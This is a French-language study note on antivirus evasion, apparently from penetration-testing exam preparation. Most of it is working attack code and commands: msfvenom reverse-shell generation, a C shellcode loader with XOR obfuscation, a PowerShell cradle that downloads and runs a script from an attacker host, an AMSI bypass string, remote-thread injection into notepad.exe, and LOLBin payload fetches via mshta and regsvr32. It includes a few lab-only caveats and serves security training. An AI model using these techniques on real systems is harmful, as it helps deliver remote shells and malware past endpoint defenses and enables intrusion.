# 13 — Antivirus Evasion

## Objectifs
Comprendre la détection (signatures, heuristique, comportement) et produire un payload qui s'exécute malgré Windows Defender. En examen : rare sur les machines, utile en scénario AD.

---

## 1. Comment l'AV détecte

| Méthode | Principe | Contournement |
|---|---|---|
| **Signature** | hash / motifs connus | obfuscation, encodage |
| **Heuristique** | code suspect | réécriture, chiffrement |
| **Comportement (EDR)** | actions (injection, LSASS) | techniques furtives |
| **Cloud / réputation** | fichier jamais vu | binaire fraîchement compilé |

```powershell
# Vérifier l'état de Defender
Get-MpComputerStatus
Get-MpPreference | Select ExclusionPath, DisableRealtimeMonitoring

# Scan à la demande d'un fichier (côté cible, test)
Start-MpScan -ScanPath C:\Temp\payload.exe
```

> Ne jamais désactiver l'AV d'une cible réelle. En lab on peut ajouter une exclusion pour tester, jamais en examen.

---

## 2. Payload de base (détecté)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
# → détecté presque immédiatement
```

Raisons : stub Metasploit connu, chaînes en clair, sections typiques.

---

## 3. Encodage (insuffisant seul)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
         -e x64/xor_dynamic -i 10 -f exe -o enc.exe
```

Utile contre les signatures simples, inutile contre Defender moderne. À combiner avec autre chose.

---

## 4. Shellcode dans un binaire légitime

```bash
# Méthode manuelle : injecter le shellcode dans un .exe signé
# 1. Générer le shellcode en C
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f c -o sc.txt

# 2. Compiler un loader C qui alloue + exécute
```

```c
// loader.c
#include <windows.h>
unsigned char sc[] = { 0xfc,0x48,0x83,0xe4,0xf0 /* ... */ };

int main() {
    LPVOID mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, sizeof(sc));
    ((void(*)())mem)();
    return 0;
}
```
```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe
```

### Chiffrement XOR du shellcode
```python
# enc.py
sc = open("sc.bin","rb").read()
key = 0xAA
enc = bytes(b ^ key for b in sc)
print(",".join(f"0x{b:02x}" for b in enc))
```
```c
// décodage en mémoire avant exécution
for (int i = 0; i < sizeof(sc); i++) sc[i] ^= 0xAA;
```

---

## 5. Exécution en mémoire (le plus efficace)

### PowerShell en mémoire
```powershell
# Téléchargement + exécution sans fichier sur disque
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')

# Version encodée base64
$c = "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
# puis : powershell -enc <BASE64>
```

```bash
# Côté attaquant
python3 -m http.server 80
```

### AMSI (dans un lab uniquement)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Defender détecte souvent cette chaîne → obfusquer ou utiliser une autre approche.

---

## 6. Thread injection (technique du module)

Principe : allouer dans un processus légitime (`notepad.exe`) et exécuter via `CreateRemoteThread`.

```c
// inject.c (simplifié)
#include <windows.h>
unsigned char sc[] = { /* shellcode */ };

int main() {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, sc, sizeof(sc), NULL);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    return 0;
}
```
```bash
x86_64-w64-mingw32-gcc inject.c -o inject.exe
```

> Détecté par les EDR modernes (comportement), acceptable en lab.

---

## 7. Alternatives plus discrètes

```bash
# 1. Script encodé + LOLBins
powershell -nop -w hidden -enc <BASE64>
mshta http://<LHOST>/payload.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...
regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll

# 2. Binaire compilé à la volée (jamais vu)
# 3. Payload dans un fichier signé (DLL sideloading)
# 4. .NET : compile via csc.exe sur la cible
```

```powershell
# Compilation .NET sur cible (C# → exe en mémoire)
$src = 'using System; class P { static void Main(){ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); } }'
# csc.exe ou Add-Type
Add-Type -TypeDefinition $src -OutputAssembly C:\Temp\x.exe
```

---

## 8. Tester la détection

```bash
# Calculer le hash et vérifier sur VirusTotal (jamais uploader un payload d'examen réel)
sha256sum shell.exe
```

```powershell
# Sur une VM Windows de test
Start-MpScan -ScanPath C:\Temp\shell.exe
# Ou tenter l'exécution et observer
```

Boucle : compiler → tester → modifier (XOR, section, chaînes, compilation fraîche).

---

## 9. Pièges

| Piège | Conséquence |
|---|---|
| msfvenom brut | détecté immédiatement |
| Encodage seul | contourne uniquement les vieilles signatures |
| Tester sur la cible réelle | détruit l'accès, bruit |
| Payload qui écrit sur disque | scanné |
| Mauvaise architecture (x86 sur x64) | ne s'exécute pas |
| Oublier le quota Metasploit | machine invalidée |

---

## 10. Checklist

- [ ] Méthode de détection identifiée (signature / comportement)
- [ ] Payload compilé localement, architecture correcte
- [ ] Testé sur VM Windows avec Defender actif
- [ ] Exécution en mémoire privilégiée si possible
- [ ] Listener prêt avant l'envoi
- [ ] Fallback prévu (LOLBin, PowerShell encodé)
- [ ] Si MSF déjà utilisé ailleurs → méthode alternative
